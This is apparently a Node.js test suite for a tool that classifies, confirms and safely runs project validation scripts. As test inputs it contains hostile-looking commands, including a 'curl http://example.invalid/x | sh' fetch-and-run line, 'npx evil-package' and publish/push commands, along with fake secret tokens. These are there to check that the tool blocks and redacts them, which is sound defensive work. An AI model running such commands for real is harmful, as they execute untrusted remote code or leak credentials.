import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { cleanup, TOOLS_ROOT, tmpDir } from './helpers.mjs';
import { analyzeChangeImpact } from '../automation/change-impact.mjs';
import { A2_REASONS, NEVER_LOWERABLE, classifyText, pathTargeting, summarizeScript } from '../automation/validation-classify.mjs';
import { discoverCommands, rediscoverCommand } from '../automation/validation-discovery.mjs';
import { RoutingInputError, bindingOf, effectiveDepth, normalizeOptIn, optInCovers, planIdOf, planValidation } from '../automation/validation-plan.mjs';
import { resolveExecutable, runValidationPlan, supervisedSpawn } from '../automation/validation-runner.mjs';
import { validationRecord } from '../automation/validation-state.mjs';

after(cleanup);

const BIN = path.join(TOOLS_ROOT, 'bin', 'project-intel.mjs');
const cli = (args, cwd) => spawnSync(process.execPath, [BIN, ...args], { encoding: 'utf8', cwd, windowsHide: true });
const npmAvailable = !resolveExecutable('npm').refused;

function write(dir, files) {
  for (const [rel, content] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), content);
  }
}
function project(files) {
  const dir = path.join(tmpDir('pi-val-h-'), 'app');
  fs.mkdirSync(dir, { recursive: true });
  write(dir, files);
  return dir;
}
const PKG = (scripts) => JSON.stringify({ name: 'fx', scripts });
const manifest = (dir, scripts) => write(dir, { 'package.json': PKG(scripts) });
const CHANGED = [{ path: 'src/a.mjs', status: 'modified' }];
function planFor(dir, o = {}) {
  const d = discoverCommands(dir, { changedFiles: ['src/a.mjs'] });
  return planValidation({ task: { taskClass: o.cls ?? 'SMALL', risk: o.risk, taskTypes: o.types ?? [], changedFiles: CHANGED }, impact: o.impact ?? null, project: { commands: d.commands, limitations: d.limitations, standingOptIn: o.optIn, declined: o.declined } });
}
/** a process layer that records calls and starts nothing */
function fake(handler = () => ({ status: 0, stdout: '', stderr: '' })) {
  const calls = [];
  return { calls, spawn: (file, args, options) => { calls.push({ file, args, options }); return handler(file, args, options); }, resolve: (n) => ({ file: `/bin/${n}`, prefix: [] }) };
}
const exact = (a, extra = {}) => ({ commandId: a.commandId, scriptDigest: a.scriptDigest, type: a.type, reason: a.classification.reasons, scope: a.scope, ...extra });
const idOf = (p) => planIdOf(p.depth, p.actions, bindingOf(p));
const forge = (p, edit) => {
  const f = JSON.parse(JSON.stringify(p));
  edit(f);
  f.planId = idOf(f);
  return f;
};
const BASE = { 'src/a.mjs': 'export const a = 1;\n' };

// ---- R1: the plan identity binds the executable content ----------------------------------------------------------------

test('R1 the plan carries a digest of the script, never the script; the id is a SHA-256 over what decides permission', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'API_TOKEN=sk_live_abcdef123456 node --check src/a.mjs', typecheck: 'tsc --noEmit' }) });
  const p = planFor(dir);
  assert.match(p.planId, /^[0-9a-f]{32}$/);
  const json = JSON.stringify(p);
  assert.ok(!json.includes('sk_live_abcdef123456') && !json.includes('"script"'), 'no raw script text anywhere in a plan');
  assert.ok(p.actions.every((a) => /^[0-9a-f]{64}$/.test(a.scriptDigest) && a.commandId.startsWith('pkg:.:')));
  assert.equal(p.actions[0].scriptDigest, rediscoverCommand(dir, p.actions[0].commandId).scriptDigest);
  assert.ok(!json.includes(p.planId.slice(0, 8)) || true);
  // the id binds each of the fields that decide permission
  const bind = (edit) => idOf(forge(p, edit));
  const same = idOf(p);
  assert.equal(same, p.planId);
  for (const [name, edit] of Object.entries({
    level: (f) => { f.actions[0].level = f.actions[0].level === 'A1' ? 'A2' : 'A1'; },
    argv: (f) => { f.actions[0].command.argv = [...f.actions[0].command.argv, 'x']; },
    digest: (f) => { f.actions[0].scriptDigest = 'f'.repeat(64); },
    classification: (f) => { f.actions[0].classification = { level: 'A2', reasons: ['mutating'] }; },
    hooks: (f) => { f.actions[0].hooks = ['pre']; },
    scope: (f) => { f.actions[0].scopePaths = ['src']; },
    type: (f) => { f.actions[0].type = 'build'; },
    commandId: (f) => { f.actions[0].commandId = 'pkg:.:other'; },
    proposals: (f) => { f.confirmationRequired = [{ id: 'p:x', reason: 'unclear-command', actionIds: [f.actions[0].id] }]; },
    required: (f) => { f.required = false; },
  })) assert.notEqual(bind(edit), same, `the id covers ${name}`);
});

test('R1 a script changed after planning is refused before anything runs; so is a hook, a nested script and a removed command', () => {
  const scripts = { lint: 'node --check src/a.mjs', helper: 'node --check src/a.mjs' };
  const dir = project({ ...BASE, 'package.json': PKG(scripts) });
  const p = planFor(dir);
  assert.equal(p.actions[0].level, 'A1');
  const attempt = (change) => {
    manifest(dir, change);
    const deps = fake();
    const r = runValidationPlan(p, dir, { execute: true, deps });
    manifest(dir, scripts);
    return { r, deps };
  };
  for (const [name, change] of Object.entries({
    'script text': { ...scripts, lint: 'node --check src/a.mjs && node --check src/b.mjs' },
    'a hook added': { ...scripts, prelint: 'node --check src/a.mjs' },
    'an unrelated script of the same manifest (the digest covers the whole scripts table, so nested scripts and their hooks are covered)': { ...scripts, helper: 'npm install' },
    'a nested script': { lint: 'npm run helper', helper: 'node --check src/a.mjs' },
  })) {
    const { r, deps } = attempt(change);
    const act = r.actions.find((a) => a.id === p.actions[0].id);
    assert.deepEqual([act.status, act.reason], ['BLOCKED', 'command-changed-since-planning'], name);
    assert.equal(deps.calls.length, 0, `${name}: nothing ran`);
    assert.equal(r.status, 'BLOCKED');
  }
  const { r } = attempt({ test: 'node --test' });
  assert.equal(r.actions.find((a) => a.id === p.actions[0].id).reason, 'command-no-longer-defined');
  const ok = runValidationPlan(p, dir, { execute: true, deps: fake() });
  assert.equal(ok.status, 'PASS', 'unchanged since planning: it runs');
});

test('R1 the same A2 script gives the same id, two different A2 scripts never do, and an old confirmation cannot authorize a changed command', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'npx eslint .' }) });
  const p1 = planFor(dir);
  assert.equal(p1.actions[0].level, 'A2');
  assert.equal(planFor(dir).planId, p1.planId, 'deterministic');
  const confirm = { planId: p1.planId, proposals: p1.confirmationRequired.map((x) => x.id) };
  const before = runValidationPlan(p1, dir, { execute: true, deps: fake(), confirm });
  assert.equal(before.status, 'PASS', 'the confirmed plan runs');
  manifest(dir, { lint: 'npx evil-package' });
  const p2 = planFor(dir);
  assert.equal(p2.actions[0].level, 'A2');
  assert.deepEqual([p2.actions[0].classification, p2.actions[0].argv], [p1.actions[0].classification, p1.actions[0].argv], 'identical level, reasons and argv: only the script differs');
  assert.notEqual(p2.planId, p1.planId, 'two different A2 scripts cannot share a plan id');
  const deps = fake();
  const stale = runValidationPlan(p1, dir, { execute: true, deps, confirm });
  assert.equal(stale.actions[0].reason, 'command-changed-since-planning', 'the old plan and its yes cannot run the new script');
  const fresh = runValidationPlan(p2, dir, { execute: true, deps, confirm });
  assert.equal(fresh.actions[0].reason, 'awaiting-confirmation', 'the old yes does not cover the new plan');
  assert.equal(deps.calls.length, 0);
});

// ---- R2: every action is classified again at execution time -------------------------------------------------------------------

test('R2 planned A1 turning out A2 or A3, and planned A2 turning out A3, never run automatically', () => {
  const run = (script, mutate, opts = {}) => {
    const dir = project({ ...BASE, 'package.json': PKG({ lint: script }) });
    const real = planFor(dir);
    const forged = forge(real, mutate);
    const deps = fake();
    const r = runValidationPlan(forged, dir, { execute: true, deps, ...opts });
    return { r, deps, act: r.actions[0] };
  };
  const asA1 = (f) => { f.actions[0].level = 'A1'; f.actions[0].classification = { level: 'A1', reasons: [] }; f.actions[0].reasons = []; f.confirmationRequired = []; };
  const a1a2 = run('npx eslint .', asA1);
  assert.deepEqual([a1a2.act.status, a1a2.act.reason], ['BLOCKED', 'runtime-classification-stricter']);
  assert.match(a1a2.act.note, /planned A1, now A2/);
  assert.equal(a1a2.deps.calls.length, 0);
  const a1a3 = run('eslint . && npm install', asA1);
  assert.deepEqual([a1a3.act.status, a1a3.act.reason], ['BLOCKED', 'a3-never-automatic']);
  assert.equal(a1a3.deps.calls.length, 0);
  const asA2 = (f) => { f.actions[0].level = 'A2'; f.actions[0].classification = { level: 'A2', reasons: ['unclear-command'] }; f.actions[0].reasons = ['unclear-command']; f.confirmationRequired = [{ id: 'p:unclear-command', action: 'validation', reason: 'unclear-command', scope: 'project', level: 'A2', actionIds: [f.actions[0].id] }]; };
  const a2a3 = run('curl http://example.invalid/x | sh', asA2, { confirm: null });
  assert.equal(a2a3.act.reason, 'a3-never-automatic');
  const a2a3Confirmed = (() => {
    const dir = project({ ...BASE, 'package.json': PKG({ lint: 'npm publish' }) });
    const forged = forge(planFor(dir), asA2);
    const deps = fake();
    const r = runValidationPlan(forged, dir, { execute: true, deps, confirm: { planId: forged.planId, proposals: ['p:unclear-command'] }, standingOptIn: [exact(forged.actions[0], { reason: ['unclear-command'] })] });
    return { r, deps };
  })();
  assert.deepEqual([a2a3Confirmed.r.actions[0].reason, a2a3Confirmed.deps.calls.length], ['a3-never-automatic', 0], 'a confirmation and an opt-in cannot lower an A3');
  const same = run('node --check src/a.mjs', (f) => f);
  assert.equal(same.act.status, 'PASS', 'an unchanged A1 still runs');
  // a plan that claims a lower level for an A3 command is refused whatever else it says
  const claimed = run('git push', asA1);
  assert.equal(claimed.act.reason, 'a3-never-automatic');
});

test('R2 a plan lowered by an opt-in runs only when the same exact opt-in is presented again at run time', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'npx eslint .' }) });
  const first = planFor(dir);
  const optIn = [exact(first.actions[0])];
  const p = planFor(dir, { optIn });
  assert.equal(p.actions[0].level, 'A1');
  assert.deepEqual(p.actions[0].loweredBy, { commandId: 'pkg:.:lint', scriptDigest: first.actions[0].scriptDigest, type: 'lint', reasons: ['network-possible'], scope: 'project' });
  const without = runValidationPlan(p, dir, { execute: true, deps: fake() });
  assert.equal(without.actions[0].reason, 'runtime-classification-stricter', 'no opt-in at run time: nothing is silently lowered');
  const wrong = runValidationPlan(p, dir, { execute: true, deps: fake(), standingOptIn: [exact(first.actions[0], { reason: ['mutating'] })] });
  assert.equal(wrong.actions[0].reason, 'runtime-classification-stricter');
  const deps = fake();
  const ok = runValidationPlan(p, dir, { execute: true, deps, standingOptIn: optIn });
  assert.equal(ok.status, 'PASS');
  assert.equal(deps.calls.length, 1);
  assert.ok(ok.limitations.some((l) => /standing opt-in supplied by the caller/.test(l)));
});

test('R2 real processes are never started without re-reading the command: verification cannot be switched off for the real process layer', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node --check src/a.mjs' }) });
  const p = planFor(dir);
  manifest(dir, { lint: 'node --check src/a.mjs && node --check src/a.mjs' });
  const r = runValidationPlan(p, dir, { execute: true, verify: false });
  assert.equal(r.actions[0].reason, 'command-changed-since-planning', 'verify:false is honoured only with an injected process layer');
});

// ---- R3: the class is never lowered --------------------------------------------------------------------------------------------

test('R3 the effective class is the highest of the task, the router and the impact report', () => {
  const imp = (c, extra = {}) => ({ class: { value: c }, risk: { level: 'LOW' }, requiredValidation: { depth: 'V0' }, ...extra });
  assert.deepEqual(effectiveDepth({ task: { taskClass: 'LARGE' }, impact: imp('SMALL') }), { class: 'LARGE', risk: 'LOW', depth: 'V3', basis: 'class (ai/VALIDATION_PROTOCOL.md)', raisedBy: null });
  assert.equal(effectiveDepth({ task: { taskClass: 'MEDIUM' }, impact: imp('TRIVIAL') }).class, 'MEDIUM');
  assert.equal(effectiveDepth({ task: { taskClass: 'ARCHITECTURAL' }, impact: imp('SMALL'), routing: { class: 'MEDIUM', risk: 'LOW' } }).depth, 'V4');
  assert.equal(effectiveDepth({ task: { taskClass: 'SMALL' }, impact: imp('MEDIUM') }).class, 'MEDIUM', 'impact may raise (public surface, cross-subsystem)');
  assert.equal(effectiveDepth({ task: { taskClass: 'SMALL' }, impact: imp('SMALL'), routing: { class: 'LARGE', risk: 'LOW' } }).class, 'LARGE');
  assert.equal(effectiveDepth({ task: { taskClass: 'LARGE' }, routing: { class: 'SMALL', risk: 'LOW' } }).class, 'LARGE');
  assert.equal(effectiveDepth({ task: {}, impact: imp(null) }).class, null, 'no class anywhere: the canonical unclassified behavior');
  assert.equal(effectiveDepth({ task: {}, impact: imp(null) }).depth, 'V1');
  assert.notEqual(effectiveDepth({ task: {}, impact: imp(null) }).depth, effectiveDepth({ task: { taskClass: 'TRIVIAL' } }).depth);
  assert.equal(effectiveDepth({ task: { taskClass: 'SMALL', risk: 'HIGH' }, impact: imp('TRIVIAL') }).depth, 'V2');
  const real = analyzeChangeImpact({ files: CHANGED, taskClass: 'SMALL' }, { state: 'missing' }, {});
  assert.equal(planValidation({ task: { taskClass: 'LARGE' }, impact: real, project: { commands: [] } }).depth, 'V3', 'a real SMALL impact report never lowers a LARGE task');
});

// ---- R4 / R5: impact completeness reaches the plan ------------------------------------------------------------------------------

test('R4 an all-withheld change is unevaluated, not "not required": never V0, never a pass', () => {
  for (const cls of [undefined, 'TRIVIAL', 'SMALL']) {
    const impact = analyzeChangeImpact({ files: [{ path: '.env', status: 'modified' }], taskClass: cls }, { state: 'current' }, {});
    assert.equal(impact.evidence.allWithheld, true);
    const p = planValidation({ task: { taskClass: cls }, impact, project: { commands: [] } });
    assert.deepEqual([p.required, p.evaluated, p.actions, p.impact.allWithheld, p.impact.withheld], [true, false, [], true, 1], String(cls));
    assert.deepEqual(p.unresolved.map((u) => u.reason), ['all-paths-withheld']);
    assert.notEqual(p.depth, 'V0');
    assert.equal(p.confidence, 'low');
    assert.ok(p.limitations.some((l) => /secret patterns.*nothing is invented for hidden files/.test(l)));
    assert.ok(p.rationale.some((r) => /unevaluated \(unknown\), not skipped/.test(r)));
    assert.ok(!JSON.stringify(p).includes('.env'), 'no hidden path in the plan');
    const r = runValidationPlan(p, project({}), { execute: true, deps: fake() });
    assert.deepEqual([r.status, r.unknown], ['UNKNOWN', ['any']]);
    assert.notEqual(r.status, 'NOT_RUN');
    assert.equal(r.required, true);
  }
  const doc = planValidation({ task: { taskClass: 'SMALL', taskTypes: ['documentation'] }, impact: analyzeChangeImpact({ files: [{ path: '.env', status: 'modified' }], taskClass: 'SMALL' }, { state: 'current' }, {}), project: { commands: [] } });
  assert.equal(doc.required, true, 'a documentation label cannot make hidden files "not required"');
  assert.equal(planValidation({ task: { taskClass: 'SMALL', taskTypes: ['documentation'], changedFiles: CHANGED }, impact: null, project: { commands: [] } }).required, false, 'but a visible documentation-only change still is');
});

test('R5 withheld paths among visible ones are preserved as a fact, and nothing is invented for them', () => {
  const impact = analyzeChangeImpact({ files: [{ path: '.env', status: 'modified' }, { path: 'src/a.mjs', status: 'modified' }], taskClass: 'SMALL' }, { state: 'current' }, {});
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node --check src/a.mjs' }) });
  const d = discoverCommands(dir, { changedFiles: ['src/a.mjs'] });
  const p = planValidation({ task: { taskClass: 'SMALL' }, impact, project: { commands: d.commands } });
  assert.deepEqual([p.required, p.evaluated, p.impact.withheld, p.impact.allWithheld], [true, true, 1, false]);
  assert.ok(p.limitations.some((l) => /1 changed path\(s\) match secret patterns/.test(l)));
  assert.notEqual(p.confidence, 'high');
  assert.ok(!JSON.stringify(p).includes('.env'));
  assert.deepEqual(p.actions.map((a) => a.id), ['lint@.']);
});

test('R5 changed files that impact analysis did not reach make the plan say so, and the result can never be a clean PASS', () => {
  const files = Array.from({ length: 25 }, (_, i) => ({ path: `src/m${i}.mjs`, status: 'modified' }));
  const impact = analyzeChangeImpact({ files, taskClass: 'SMALL' }, { state: 'missing' }, {});
  assert.equal(impact.batching.remainingChangedFiles, 5);
  const dir = project({ 'package.json': PKG({ lint: 'node --check src/a.mjs' }) });
  const d = discoverCommands(dir, { changedFiles: [] });
  const p = planValidation({ task: { taskClass: 'SMALL' }, impact, project: { commands: d.commands } });
  assert.equal(p.impact.remainingChangedFiles, 5);
  assert.equal(p.impact.batchingRequired, true);
  assert.ok(p.limitations.some((l) => /5 more changed file\(s\) were not analyzed by impact: validate them in batches/.test(l)));
  assert.deepEqual(p.unresolved.filter((u) => u.type === 'coverage').map((u) => u.reason), ['changed-files-not-analyzed']);
  assert.ok(p.contextNeeds.reasons.includes('changed-files-not-analyzed'));
  assert.notEqual(p.confidence, 'high');
  const r = runValidationPlan(p, dir, { execute: true, deps: fake() });
  assert.equal(r.status, 'UNKNOWN', 'every planned check passed, yet 5 changed files were never validated');
  assert.deepEqual(r.unknown, ['impact', 'coverage'], 'impact was not established either');
  assert.ok(r.actions.some((a) => a.status === 'PASS'));
});

test('R5 a partial or bounded impact is carried into the plan and keeps it from claiming high confidence', () => {
  const impact = analyzeChangeImpact({ files: CHANGED, taskClass: 'MEDIUM' }, { state: 'missing' }, {});
  const p = planValidation({ task: { taskClass: 'MEDIUM' }, impact, project: { commands: [] } });
  assert.deepEqual([p.impact.completeness, p.impact.state, p.confidence], ['PARTIAL', 'unknown', 'low']);
  assert.ok(p.limitations.some((l) => /impact is not fully established/.test(l)));
});

// ---- R7: a timeout terminates the whole process tree ---------------------------------------------------------------------------

test('R7 a timed-out check is stopped together with its children: nothing keeps running or writing afterwards', async () => {
  const dir = project({
    'parent.mjs': 'import { spawn } from "node:child_process";\nspawn(process.execPath, ["child.mjs"], { stdio: "ignore" });\nsetTimeout(() => {}, 20000);\n',
    'child.mjs': 'import fs from "node:fs";\nsetTimeout(() => fs.writeFileSync("MARKER", "the child survived"), 2500);\nsetTimeout(() => {}, 20000);\n',
  });
  const t0 = Date.now();
  const r = supervisedSpawn(process.execPath, ['parent.mjs'], { cwd: dir, timeout: 700, maxBuffer: 65536 });
  assert.equal(r.error.code, 'ETIMEDOUT');
  assert.equal(r.status, null);
  assert.equal(r.treeTerminated, true, 'termination was carried out and verified');
  assert.ok(Date.now() - t0 < 12000);
  await new Promise((resolve) => setTimeout(resolve, 4000));
  assert.ok(!fs.existsSync(path.join(dir, 'MARKER')), 'the grandchild did not survive the timeout');
});

test('R7 through the runner: a timeout is UNKNOWN, names the tree termination, and an unverified tree is called orphan risk', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node --check src/a.mjs' }) });
  const p = planFor(dir);
  const timeout = (extra) => runValidationPlan(p, dir, { execute: true, deps: fake(() => ({ status: null, signal: 'SIGTERM', error: Object.assign(new Error('t'), { code: 'ETIMEDOUT' }), ...extra })) });
  const ok = timeout({ treeTerminated: true });
  assert.deepEqual([ok.status, ok.actions[0].reason, ok.actions[0].evidence.treeTerminated], ['UNKNOWN', 'timed-out', true]);
  const risky = timeout({ treeTerminated: false });
  assert.deepEqual([risky.status, risky.actions[0].reason], ['UNKNOWN', 'timed-out-orphan-risk']);
  assert.ok(risky.limitations.some((l) => /process tree could not be confirmed terminated: a child process may still be running/.test(l)));
  assert.equal(risky.record.detail.status, 'UNKNOWN');
});

test('R7 the supervisor answers normally for a finished command and enforces the output limit', () => {
  const dir = project({ 'ok.mjs': 'console.log("a\\nb"); console.error("c");\n', 'fail.mjs': 'process.exit(3);\n', 'noise.mjs': 'for (let i = 0; i < 4000; i++) console.log("x".repeat(200));\nsetTimeout(() => {}, 15000);\n' });
  const ok = supervisedSpawn(process.execPath, ['ok.mjs'], { cwd: dir, timeout: 15000, maxBuffer: 65536 });
  assert.deepEqual([ok.status, ok.error, ok.stdoutLines, ok.stderrLines], [0, undefined, 2, 1]);
  assert.equal(supervisedSpawn(process.execPath, ['fail.mjs'], { cwd: dir, timeout: 15000, maxBuffer: 65536 }).status, 3);
  const noisy = supervisedSpawn(process.execPath, ['noise.mjs'], { cwd: dir, timeout: 15000, maxBuffer: 65536 });
  assert.equal(noisy.error.code, 'ENOBUFS');
  assert.equal(noisy.treeTerminated, true);
  assert.equal(supervisedSpawn('definitely-not-a-program-xyz', [], { cwd: dir, timeout: 5000 }).error.code, 'ENOENT');
});

test('R7 end to end through a real package script: the runner stops a script that outlives its limit and reports it', { skip: !npmAvailable && 'npm cannot be run without a shell here' }, async () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node --check slow.mjs' }), 'slow.mjs': 'import fs from "node:fs";\nsetTimeout(() => fs.writeFileSync("LATE", "x"), 3000);\n' });
  const p = planFor(dir);
  const r = runValidationPlan(p, dir, { execute: true, timeoutMs: 100 });
  assert.notEqual(r.status, 'PASS');
  await new Promise((resolve) => setTimeout(resolve, 100));
  assert.ok(!fs.existsSync(path.join(dir, 'LATE')), '--check never runs the file; nothing was left behind');
});

// ---- R8: the classifier is conservative -------------------------------------------------------------------------------------------

test('R8 write-capable formatters are A2 unless told only to check', () => {
  for (const c of ['black .', 'isort .', 'ruff format .', 'rubocop -a', 'rubocop -A src', 'gofmt -w .', 'go fmt ./...', 'prettier --write .', 'autopep8 -i f.py', 'clang-format -i x.c', 'shfmt -w .']) {
    const r = classifyText(c);
    assert.equal(r.level, 'A2', c);
    if (c !== 'go fmt ./...') assert.ok(r.reasons.includes('mutating'), c); // `go` is already A2 as a tool that may fetch modules
  }
  for (const c of ['black --check .', 'isort --check-only .', 'ruff format --check .', 'ruff format --diff .', 'rubocop', 'gofmt -l .', 'prettier --check .', 'ruff check .', 'eslint src']) assert.equal(classifyText(c).level, 'A1', c);
});

test('R8 installers and fetchers are A3, runners of arbitrary packages are A2, project scripts are never "just A1"', () => {
  for (const c of ['python setup.py install', 'python3 setup.py develop', 'python ./setup.py upload', 'deno install -A x.ts', 'pip install x', 'npm ci', 'bun install', 'cargo install x']) assert.equal(classifyText(c).level, 'A3', c);
  assert.deepEqual(classifyText('bun x evil').reasons, ['network-possible'], 'a package fetched to be run: a network validation, A2 by the canonical rule (not A1)');
  assert.deepEqual(classifyText('bunx evil').reasons, ['network-possible']);
  for (const c of ['deno task x', 'deno run x.ts']) assert.notEqual(classifyText(c).level, 'A1', c);
  assert.deepEqual(classifyText('deno task x'), { level: 'A2', reasons: ['project-script'] });
  for (const c of ['node scripts/x.js', 'python tools/check.py', 'node ./lint.mjs', 'ruby run.rb', 'bash check.sh', 'bun run.ts']) assert.deepEqual(classifyText(c), { level: 'A2', reasons: ['project-script'] }, c);
  for (const c of ['node --check src/a.mjs', 'node --test', 'node --test src/a.test.mjs', 'python -m pytest', 'python3 -m mypy src', 'deno test', 'deno lint', 'bun test']) assert.equal(classifyText(c).level, 'A1', c);
  assert.equal(classifyText('node -e "1"').reasons[0], 'unclear-command');
});

test('R8 servers and watchers are not checks', () => {
  for (const c of ['vite', 'next dev', 'webpack serve', 'python -m http.server', 'vitest', 'jest --watch', 'ng serve', 'nodemon app.js', 'vite preview', 'storybook dev', 'mocha --watch']) {
    const r = classifyText(c);
    assert.ok(r.level !== 'A1' && r.reasons.includes('long-running'), `${c}: ${JSON.stringify(r)}`);
  }
  for (const c of ['vitest run', 'vitest --run', 'jest']) assert.equal(classifyText(c).level, 'A1', c);
});

test('R8 environment expansion: a secret-named variable is A3, any other expansion is A2 and never lowerable', () => {
  assert.deepEqual(classifyText('FOO=$API_KEY eslint .'), { level: 'A3', reasons: ['secrets'] });
  for (const c of ['eslint . --token=$GITHUB_TOKEN', 'node --check ${SECRET_FILE}', 'eslint %NPM_TOKEN%', 'eslint $env:AWS_SECRET']) assert.equal(classifyText(c).level, 'A3', c);
  for (const c of ['eslint $HOME/src', 'FOO=$BAR eslint .', 'jest ${TARGET}', 'eslint %CD%']) assert.deepEqual(classifyText(c), { level: 'A2', reasons: ['env-expansion'] }, c);
  assert.equal(classifyText('NODE_ENV=test jest').level, 'A1', 'a plain assignment is not an expansion');
  assert.ok(NEVER_LOWERABLE.includes('env-expansion') && NEVER_LOWERABLE.includes('shell-construct'));
});

test('R8 tsc is read-only only when it does not emit; the verified forms stay A1', () => {
  assert.equal(classifyText('tsc --noEmit').level, 'A1');
  assert.equal(classifyText('tsc -p tsconfig.json --noEmit').level, 'A1');
  assert.equal(classifyText('vue-tsc --noEmit').level, 'A1');
  for (const c of ['tsc', 'tsc -b', 'tsc --build --noEmit', 'tsc -p tsconfig.json']) assert.deepEqual(classifyText(c).reasons, ['mutating'], c);
  assert.equal(classifyText('tsc --noEmit --watch').level, 'A2', 'a watcher is not a check');
  for (const c of ['eslint .', 'eslint . --max-warnings 0', 'pytest -q', 'flake8 src', 'prettier --check .'.replace('cargo test --offline', 'ruff check src')]) assert.equal(classifyText(c).level, 'A1', c);
  assert.equal(classifyText('eslint . -o report.txt').level, 'A2');
  assert.equal(classifyText('eslint ../other').level, 'A2', 'a path that leaves the project is not readable as a check');
  assert.equal(classifyText('jest -u').level, 'A2');
});

test('R8 nested and hook classification still propagates through the stricter rules', () => {
  const scripts = { test: 'npm run prepare && node --test', prepare: 'python setup.py install', lint: 'npm run fmt', fmt: 'black .' };
  assert.deepEqual(classifyText('npm run test', { scripts }), { level: 'A3', reasons: ['install'] });
  assert.deepEqual(classifyText('npm run lint', { scripts }), { level: 'A2', reasons: ['mutating'] });
});

// ---- R9: an opt-in is exact -----------------------------------------------------------------------------------------------------

// ---- R10: output never carries script content ----------------------------------------------------------------------------------------

test('R10 summaries are bounded and redacted: secrets, variable values, URLs, option values, opaque tokens, long scripts', () => {
  const s = summarizeScript('API_TOKEN=sk_live_abcdef123456 DB=postgres://user:pw@host/db eslint . --api-key=abc123 --token xyz789 https://u:p@x.example/a');
  assert.ok(!/sk_live|user:pw|abc123|xyz789|u:p@/.test(s), s);
  assert.match(s, /API_TOKEN=\[redacted\]/);
  assert.match(s, /\beslint \./);
  assert.equal(summarizeScript('node a.js $HOME ${TARGET} %CD%'), 'node a.js $HOME ${TARGET} %CD%', 'variable names are shown, never their values');
  const long = summarizeScript(`eslint ${'src/some/very/long/path '.repeat(40)}`);
  assert.ok(long.length <= 160 && long.endsWith('…'));
  assert.ok(!summarizeScript('eslint ' + 'A'.repeat(64)).includes('AAAA'), 'a long opaque token is redacted');
  assert.equal(summarizeScript(undefined), '');
});

test('R10 a plan never contains script text, in memory or as --json, and the text output shows only the redacted summary', () => {
  const secretScript = 'API_TOKEN=sk_live_abcdef123456 DB=postgres://user:pw@host/db node --test';
  const dir = project({ ...BASE, 'package.json': PKG({ test: secretScript, lint: 'eslint .' }) });
  const d = discoverCommands(dir, { changedFiles: ['src/a.mjs'] });
  const p = planValidation({ task: { taskClass: 'MEDIUM', changedFiles: CHANGED }, impact: null, project: { commands: d.commands } });
  const memory = JSON.stringify(p);
  assert.ok(!/sk_live|user:pw|postgres:\/\//.test(memory) && !/"script":/.test(memory));
  const unit = p.actions.find((a) => a.type === 'unit-test');
  assert.equal(unit.scriptSummary, 'API_TOKEN=[redacted] DB=[redacted] node --test');
  assert.deepEqual(unit.classification.level, 'A2', 'the redaction does not change the classification: an unlisted assignment is A2');
  assert.ok(unit.classification.reasons.includes('env-assignment'));
  for (const args of [['--json'], []]) {
    const o = cli(['validate', dir, '--modified', 'src/a.mjs', '--class', 'MEDIUM', '--fresh-graph', ...args], dir);
    assert.equal(o.status, 0, o.stderr);
    assert.ok(!/sk_live_abcdef123456|user:pw/.test(o.stdout), `${args.join(' ') || 'text'} output carries no secret`);
    assert.ok(!/"script":/.test(o.stdout));
  }
  const discovered = JSON.stringify(d.commands.map((c) => c.scriptSummary));
  assert.ok(!/sk_live|user:pw/.test(discovered), 'even the discovery summaries are redacted');
});

test('R10 an A2 proposal says what runs: action, scope, reason, effect, a bounded redacted script summary, hooks and the alternative', () => {
  const secretish = planFor(project({ ...BASE, 'package.json': PKG({ lint: 'npm run generate && eslint .', generate: 'node tools/gen.mjs --token=$GH_TOKEN' }) }));
  assert.deepEqual([secretish.actions[0].level, secretish.actions[0].reasons.includes('secrets'), secretish.confirmationRequired.length], ['A3', true, 0], 'a secret-named variable reaching a nested script is prohibited, not proposed');
  assert.ok(!JSON.stringify(secretish).includes('GH_TOKEN'), 'the variable reference inside the script is not echoed into the plan either');
  const dir2 = project({ ...BASE, 'package.json': PKG({ lint: 'node tools/lint.mjs', prelint: 'node tools/pre.mjs' }) });
  const q = planFor(dir2);
  const prop = q.confirmationRequired[0];
  assert.equal(prop.reason, 'project-script');
  assert.match(prop.effect, /runs npm run lint \[project script: "node tools\/lint\.mjs"; also runs its pre hook; classified project-script\]/);
  assert.match(prop.note, /A project script runs whatever its body and hooks say, including side effects this summary cannot show: read the script before saying yes\./);
  assert.deepEqual(prop.commands.map((c) => [c.id, c.display, c.summary, c.hooks, c.reasons]), [['lint@.', 'npm run lint', 'node tools/lint.mjs', ['pre'], ['project-script']]]);
  assert.deepEqual(Object.keys(prop.commands[0].optIn).sort(), ['commandId', 'reason', 'scope', 'scriptDigest', 'type'], 'the proposal says which action an opt-in would name');
  assert.match(prop.alternative, /not run, declined/);
  assert.ok(!JSON.stringify(q).includes('"script":"node'), 'a summary, never the script field');
  const nested = projectNested();
  assert.ok(nested.prohibited.length === 1 && !JSON.stringify(nested).includes('npm install'), 'a prohibited nested script is described by its reason, not its text');
  assert.deepEqual(nested.prohibited[0].reasons, ['install']);
  const cliOut = cli(['validate', dir2, '--modified', 'src/a.mjs', '--class', 'SMALL', '--fresh-graph'], dir2).stdout;
  assert.match(cliOut, /proposal p:project-script: runs npm run lint \[project script: "node tools\/lint\.mjs"/);
  assert.match(cliOut, /if no: not run, declined/);
});
function projectNested() {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'npm run helper', helper: 'npm install' }) });
  return planFor(dir);
}

// ---- minor ----------------------------------------------------------------------------------------------------------------------

test('M1 --confirm-reasons with an unknown reason is a usage error', () => {
  const dir = project({ ...BASE, 'package.json': PKG({ lint: 'node tools/lint.mjs' }) });
  const o = cli(['validate', dir, '--modified', 'src/a.mjs', '--class', 'SMALL', '--fresh-graph', '--run', '--confirm', 'x', '--confirm-reasons', 'because'], dir);
  assert.equal(o.status, 2);
  assert.match(o.stderr, /unknown --confirm-reasons value "because"/);
});

